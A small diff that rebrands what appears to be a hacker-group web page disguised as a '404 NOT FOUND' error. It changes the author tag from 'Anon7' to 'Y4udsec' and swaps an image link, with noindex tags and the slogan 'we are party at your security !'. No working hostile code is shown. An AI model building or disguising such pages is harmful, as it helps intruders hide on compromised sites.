@@ -2,11 +2,11 @@
 <html>
 <head>
     <title>404 NOT FOUND</title>
-    <meta name="author" content="Anon7">
+    <meta name="author" content="Y4udsec">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="description" content="we are party at your security !">
     <meta property="og:description" content="we are party at your security !">
-    <meta property="og:image" content="https://i.imgur.com/6RSyvoJ.jpg">
+    <meta property="og:image" content="https://imgur.com/a/58E0rE2">
     <meta name="robots" content="noindex">
     <meta name="googlebot" content="noindex">
     <meta name="theme-color" content="#0a0a0a">
@@ -945,4 +945,5 @@ echo '</div>';
         }
     </script>
 </body>
+
 </html>
